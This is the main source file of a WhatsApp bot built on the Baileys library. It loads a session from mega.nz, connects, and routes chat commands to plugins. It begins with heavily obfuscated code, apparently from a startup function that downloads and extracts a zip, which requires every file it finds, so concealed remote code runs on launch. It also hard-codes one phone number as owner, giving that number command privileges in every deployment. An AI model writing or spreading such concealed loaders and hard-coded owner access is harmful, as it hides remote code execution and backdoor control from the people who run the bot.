_0x24a8c3(_0x1d72b4,_0x106a83-0x11e,_0x1c4d6f-0x1bb,_0x25d78d-0x34,_0x25d78d-0xde);}_0x40e19c[_0x27b69c(0x510,0x51d,0x50b,'\x44\x5b\x58\x39',0x4ee)](path[_0x27b69c(0x4c0,0x498,0x49b,'\x62\x43\x39\x29',0x4a3)+'\x6d\x65'](_0x54f723)[_0xf81fbf(0x5a,'\x76\x33\x68\x34',0x76,0x73,0xa3)+_0xb6d7be(-0x237,-0x1f6,-0x240,'\x6a\x37\x4c\x56',-0x21e)+'\x65'](),_0x40e19c[_0x5f1cb9('\x77\x4f\x5b\x55',0x194,0x170,0x1b6,0x167)])&&_0x40e19c[_0x27b69c(0x4af,0x4bb,0x4ae,'\x31\x64\x23\x54',0x4ce)](require,_0x40e19c[_0x27b69c(0x4c7,0x4bc,0x4d9,'\x35\x26\x40\x28',0x4cb)](_0x40e19c[_0x5f1cb9('\x44\x5b\x58\x39',0x148,0x12a,0x151,0x11d)],_0x54f723));}),console[_0x508718(0x3d8,'\x6a\x76\x6d\x36',0x417,0x423,0x40a)](_0x40e19c[_0x24a8c3('\x35\x79\x77\x71',-0x24c,-0x273,-0x245,-0x22c)]);}catch(_0x13ed57){console[_0x591937(0x42a,0x410,0x439,'\x24\x41\x21\x49',0x3de)](_0x40e19c[_0x591937(0x428,0x420,0x406,'\x44\x5b\x58\x39',0x402)],_0x13ed57[_0x2a9b7e('\x29\x7a\x56\x26',0x328,0x332,0x35d,0x348)+'\x67\x65']);}}

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, jidNormalizedUser, getContentType, fetchLatestBaileysVersion, Browsers } = require('@whiskeysockets/baileys');
const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const P = require('pino');
const config = require('./config');
const qrcode = require('qrcode-terminal');
const util = require('util');
const { sms, downloadMediaMessage } = require('./lib/msg');
const axios = require('axios');
const ownerNumber = ['94703830990'];

if (!fs.existsSync(__dirname + '/session/creds.json')) {
  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');
  const sessdata = config.SESSION_ID;
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
  filer.download((err, data) => {
    if (err) throw err;
    fs.writeFile(__dirname + '/session/creds.json', data, () => { console.log("Session downloaded ✅") });
  })
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

async function connectToWA() {
 await downloadAndExtractZip();
  const connectDB = require('./lib/mongodb');
  connectDB();
  const { readEnv } = require('./lib/database');
  const config = await readEnv();
  const prefix = config.PREFIX;
  console.log("Connecting WA bot 🧬...");

  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/');
  const { version } = await fetchLatestBaileysVersion();
  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version
  });

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {

      console.log("✅ Plugins installed and connected...");

      console.log('Bot connected to WhatsApp ✅');
      let up = `*HI*\n*LAKSIDU* *IAM*\n*ONLINE* *NOW.*👨‍💻*`;
      conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://telegra.ph/file/ef48cc8d2d26081f7d46a.jpg` }, caption: up });
    }
  });

  conn.ev.on('creds.update', saveCreds);
  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
      await conn.readMessages([mek.key]);
    }

    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
    const isCmd = body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'Sin Nombre';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? await groupMetadata.participants : [];
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : [];
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
    const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: mek }) };

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      let res = await axios.head(url);
      mime = res.headers['content-type'];

      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
      }
      let type = mime.split("/")[0] + "Message";
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
      }
    };

    if (senderNumber.includes("94703830990")) {
      if (isReact) return;
      m.react("👨‍💻");
    }

    if (!isOwner && config.MODE === "private") return;
    if (!isOwner && isGroup && config.MODE === "inbox") return;
    if (!isOwner && !isGroup && config.MODE === "groups") return;

    const events = require('./command');
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;

    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });
        try {
          cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }

    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
        command.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      }
    });
  });
}

connectToWA();
